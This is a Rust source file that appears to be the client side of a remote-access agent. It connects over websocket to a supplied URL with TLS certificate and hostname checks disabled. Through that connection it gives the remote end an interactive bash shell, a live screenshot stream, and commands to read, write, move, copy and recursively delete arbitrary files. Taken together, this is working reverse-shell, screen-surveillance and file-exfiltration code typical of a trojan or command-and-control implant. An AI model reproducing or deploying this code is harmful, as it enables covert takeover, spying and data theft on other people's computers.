use image::metadata;
use rustls::internal::msgs;
use tokio_tungstenite::{Connector, WebSocketStream, connect_async_tls_with_config, tungstenite::Message};
use native_tls::{TlsConnector, TlsStream};
use futures::{SinkExt, StreamExt};
use tokio::io::{AsyncBufReadExt, BufReader,AsyncReadExt,AsyncWriteExt};
use serde::{Deserialize, Serialize};
use url::Url;
use tokio::sync::Mutex;
use std::{os::unix::fs::MetadataExt, sync::Arc};
use crate::screen;

pub async fn stream_handler(txye:String,session_key: String,url: String){
    println!("{}:{}:{}", txye,session_key,url);
    match txye.as_str(){

        "shell" => {
            // TODO fix multiple OS
            let _ = progarm_stdin_stdout(session_key,url,"bash".to_string()).await;
        }
        "remote" => {

        }
        
        "vpn" => {

        }

        "files" => {
            let _ =  file_system(session_key, url).await;
        }
        "screen" => {
            let _ = screen_stream(session_key, url,20.to_string()).await;
        }
        _ => {

        }
    } 
}

pub async fn connect_ws(session_key:String,url:String) -> Option<WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>>{ 
    let url = Url::parse(&url).unwrap();
        let tls_connector = TlsConnector::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .build()
        .unwrap();
    let connector = Connector::NativeTls(tls_connector);
    let stream = connect_async_tls_with_config(url, None,Some(connector))
        .await;

    match stream {
        Ok((mut wsstream,_)) => {
            let _ = wsstream.send(tokio_tungstenite::tungstenite::Message::Text(session_key)).await;
            return Some(wsstream);
        }
        Err(_) => {
            return None;
        },
    }
}


// STREAM PROGRAMMS
pub async fn screen_stream(session_key: String, url: String,fps:String) -> bool {
    let fps: u64 = match fps.parse() {
        Ok(f) if f > 0 => f,
        _ => {
            return false;
        }
    };
    let frame_delay = tokio::time::Duration::from_millis(1000 / fps);
    let mut wsstream = match connect_ws(session_key, url).await {
        Some(tuple) => tuple,  
        None => return false,
    };
    loop {
        let base64_screen = screen::takescreen();


        if let Err(e) = wsstream.send(Message::Text(base64_screen)).await {
            println!("Send failed, stream is closed: {:?}", e);
            return false;
        }

        match wsstream.next().await {
            Some(Ok(Message::Close(_))) => {
                println!("Remote closed websocket");
                return false;
            }
            Some(Err(e)) => {
                println!("WebSocket error: {:?}", e);
                return false;
            }
            None => {
                println!("WebSocket dropped");
                return false;
            }
            _ => {}
        }
        tokio::time::sleep(frame_delay).await;
    }
}

pub async fn file_system(session_key: String,url: String) -> bool {
    
    let mut wsstream = match connect_ws(session_key, url).await {
        Some(tuple) => tuple,  
        None => return false,
    };
    
    while let Some(msg) = wsstream.next().await  {
            let msg = match msg{
                Ok(msg) => {
                    msg
                },
                Err(_) => {
                    println!("This ws Task Exited because of an websocket Error");
                    return false;
                },
            };
            if let Message::Text(msg) = msg{


                if msg.starts_with("read"){
                    let parts: Vec<&str> = msg.split(",").collect();
                    if parts.len() != 2{
                        let _ = wsstream.send(Message::Text("Error: 'read' is Requiring a path arg".to_string())).await;
                        continue;
                    }
                    else {
                        let path = parts[1];
                        let mut file = match std::fs::File::open(path){
                            Ok(file) => file,
                            Err(_) => {
                                let _ = wsstream.send(Message::Text("Error: 'read' failed to open a path".to_string())).await;
                                continue;
                            },
                        }; 
                        let mut buffer = [0u8; 1024];
                        loop {
                            let bytes_read = match std::io::Read::read(&mut file, &mut buffer) {
                                Ok(0) => break, 
                                Ok(n) => n,
                                Err(e) => {
                                    
                                    let _ = wsstream.send(Message::Text(format!("Error: Failed to read file - {}", e))).await;
                                    continue; 
                                }
                            };
                            match wsstream.send(Message::Binary(buffer[..bytes_read].to_vec())).await{
                                Ok(msg) => msg,
                                Err(_) => {
                                    break;
                                },
                            }
                        }
                        continue;


                    }
                }
                else if msg.starts_with("write") {
                    let parts: Vec<&str> = msg.split(",").collect();
                    if parts.len() != 2{
                        let _ = wsstream.send(Message::Text("Error: 'write' is Requiring a path arg".to_string())).await;
                        continue;
                    }
                    else {
                        let path = parts[1];
                        let mut file = match std::fs::File::create(path) {
                            Ok(file) => file,
                            Err(_) => {
                                let _ = wsstream.send(Message::Text("Error: Failed to create file.".to_string())).await;
                                continue;
                            }
                        };
                        loop {
                            match wsstream.next().await{
                                Some(Ok(Message::Binary(chunk))) => {
                                   
                                    if let Err(e) = std::io::Write::write_all(&mut file, &chunk) {
                                        let _ = wsstream.send(Message::Text(format!("Error: Failed to write to file - {}", e))).await;
                                        
                                    }
                                }
                                Some(Ok(Message::Close(_))) | None => {
                                    
                                    break;
                                }
                                _ => {}
                            } 
                        }
                    }

                }
                else if msg.starts_with("move") {
                    let parts: Vec<&str> = msg.split(",").collect();
                    if parts.len() != 3{
                        let _ = wsstream.send(Message::Text("Error: 'move' is Requiring 2 path args".to_string())).await;
                        continue;
                    }
                    let source = parts[1];
                    let destination = parts[2];
                    let source_path = std::path::Path::new(source);
                    if !source_path.exists() {
                        let _ = wsstream.send(Message::Text("Error: 'move' sourcefile does not exist".to_string())).await;
                        continue;
                    }
                    match std::fs::rename(source, destination) {
                        Ok(_) => {
                            let _ = wsstream.send(Message::Text(format!("File moved from '{}' to '{}'", source, destination))).await;
                            
                        },
                        Err(e) => {
                            let _ = wsstream.send(Message::Text(format!("Error: Failed to move file - {}", e))).await;
                        },
                    }

                }
                else if msg.starts_with("ls") {

                    #[derive(Serialize, Deserialize, Debug, Clone)]
                    pub struct entrie {
                        pub(crate)  name: String,
                        pub(crate)  typ: String,
                        pub(crate)  size: u64,
                    }
     
                    let mut entrsys: Vec<entrie> = Vec::new();
                    let parts: Vec<&str> = msg.split(",").collect();
                    if parts.len() != 2{
                        let _ = wsstream.send(Message::Text("Error: 'ls' is Requiring a path arg".to_string())).await;
                        continue;
                    }
                    let path = parts[1];
                    let path = std::path::Path::new(path);
                    if path.is_dir(){
                        let entries = std::fs::read_dir(path);
                        match entries {
                            Ok(entries) => {
                                for entry in entries{
                                    match entry {
                                        Ok(entry) => {
                                            let name = entry.file_name();
                                            let name = match name.into_string() { // not optimal needs fix to not exclude files
                                                Ok(name) => {
                                                    name
                                                },
                                                Err(_) => {
                                                    continue;
                                                },
                                            };
                                            let metadata = match entry.metadata(){
                                                Ok(metadata) => {
                                                    metadata
                                                },
                                                Err(_) => {
                                                    continue;
                                                }, 
                                            };
                                            // TODO add premissions(this is relly unrelayble) 
                                            // lastedited creadted 
                                            // owners
                                            

                                            let filetype = metadata.file_type();
                                            let mut typs = "";
                                            if filetype.is_dir(){
                                                typs = "dir"
                                            }
                                            else if filetype.is_file() {
                                                typs = "file"
                                            }
                                            else if filetype.is_symlink() {
                                                typs = "symlink"
                                            }
                                            else {
                                                typs = "unknown"
                                            }
                                            let file_size = metadata.size();
                                            let ent: entrie = entrie { name: name, typ: typs.to_string(), size: file_size };
                                            entrsys.push(ent);

                                        },
                                        Err(e) => {
                                            let _ = wsstream.send(Message::Text(format!("Error: 'ls' failed to get entrie this only true for one - {}", e))).await;
                                        },
                                    }
                                }
                                let var = match serde_json::to_string(&entrsys){
                                    Ok(var) => var,
                                    Err(e) => {
                                        let _ = wsstream.send(Message::Text(format!("Error: Failed to serilize the dir entrys - {}", e))).await;
                                        continue;
                                    } ,
                                };
                                if let Err(e) = wsstream.send(Message::Text(var)).await{
                                    break;
                                }

                            },
                            Err(e) => {
                                let _ = wsstream.send(Message::Text(format!("Error: Failed to read directory - {}", e))).await;
                            },
                        }
                    }
                    else {
                        let _ = wsstream.send(Message::Text("Error: 'ls' wrong path given".to_string())).await;
                        continue;
                    }


                    let metadata = std::fs::metadata(path);
                }
                else if msg.starts_with("delet") {
                    let parts: Vec<&str> = msg.split(",").collect();
                    if parts.len() != 2{
                        let _ = wsstream.send(Message::Text("Error: 'delet' is Requiring a path arg".to_string())).await;
                        continue;
                    }
                    let path = std::path::Path::new(parts[1]);
                    if !path.exists(){
                        let _ = wsstream.send(Message::Text("Error: 'delet' was given an invalid path".to_string())).await;
                        continue;
                    }
                    if path.is_dir(){
                        
                        if let Err(e)  = std::fs::remove_dir_all(path){
                            let _ = wsstream.send(Message::Text(format!("Error: 'delet' failed to delet the directory -e {}",e).to_string())).await;
                            continue;
                        };

                    }
                    else {
                        if let Err(e)  = std::fs::remove_file(path){
                            let _ = wsstream.send(Message::Text(format!("Error: 'delet' failed to delet the file -e {}",e).to_string())).await;
                            continue;
                        };

                    }
                    

                }
                else if msg.starts_with("copy") {
                    let parts: Vec<&str> = msg.split(",").collect();
                    if parts.len() != 3{
                        let _ = wsstream.send(Message::Text("Error: 'copy' is Requiring two path args".to_string())).await;
                        continue;
                    }
                    let source = parts[1];
                    let destenation = parts[2];
                    if let Err(e) = std::fs::copy(source, destenation){
                        let _ = wsstream.send(Message::Text(format!("Error: 'copy' failed to copy file {}",e).to_string())).await;
                    }

                }
            
            }
            

            
        };

    return true;


}

pub async fn progarm_stdin_stdout(session_key: String, url: String,program: String) -> bool {
    use std::process::{ Stdio};
    use tokio::process::Command;
    let mut wsstream = match connect_ws(session_key, url).await {
        Some(tuple) => tuple,  
        None => return false,
    };
    let mut arg = "";
    if program == "bash" || program ==  "sh"{
        arg = "-i";
    }
    else if program == "cmd.exe" {
        arg = ""
    }
    else if program == "powerhsell.exe " {
        arg = ""
    }
    else {
        let _ = wsstream.send(Message::Binary("This Program is untest and might not work".as_bytes().to_vec())).await;
    }
    let mut p1 = match Command::new(program)
        .args(&[arg]) 
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn() {
            Ok(child) => child,
            Err(_) => return false,
    };
    

    let mut child_stdin  = p1.stdin.take().unwrap();
    let mut child_stdout = p1.stdout.take().unwrap();
    let mut child_stderr = p1.stderr.take().unwrap();
    let (mut ws_write, mut ws_read) = wsstream.split();
    let ws_write = Arc::new(Mutex::new(ws_write));

    let stdin_task = tokio::spawn(async move {
        while let Some(msg) = ws_read.next().await  {
            let msg = match msg{
                Ok(msg) => {
                    msg
                },
                Err(_) => {
                    println!("This ws Task Exited because of an websocket Error");
                    return;
                },
            };
            if let Message::Binary(msg) = msg{
              
                if let Err(e) = child_stdin.write_all(&msg).await{
                    println!("This ws reader Task crashed with: {}", e);
                    return;
                }
                
            }
            else {
                println!("This Weboscket Only Accepts Binary")
            }

        };
    });
    let ws_write_stdout = ws_write.clone();
    tokio::spawn(async move {
        let mut buf = [0u8; 1024];
        loop {
            let n = match child_stdout.read(&mut buf).await {
                Ok(0) | Err(_) => break,
                Ok(n) => n,
            };
            let mut sink = ws_write_stdout.lock().await;
        
            if sink.send(Message::Binary(buf[..n].to_vec())).await.is_err() {
                break;
            }
        }
    });
    let ws_write_stderr = ws_write.clone();
    tokio::spawn(async move {
        let mut buf = [0u8; 1024];
        loop {
            let n = match child_stderr.read(&mut buf).await {
                Ok(0) | Err(_) => break,
                Ok(n) => n,
            };
            let mut sink = ws_write_stderr.lock().await;
            
            if sink.send(Message::Binary(buf[..n].to_vec())).await.is_err() {
                break;
            }
        }
    });



    return true;   
}
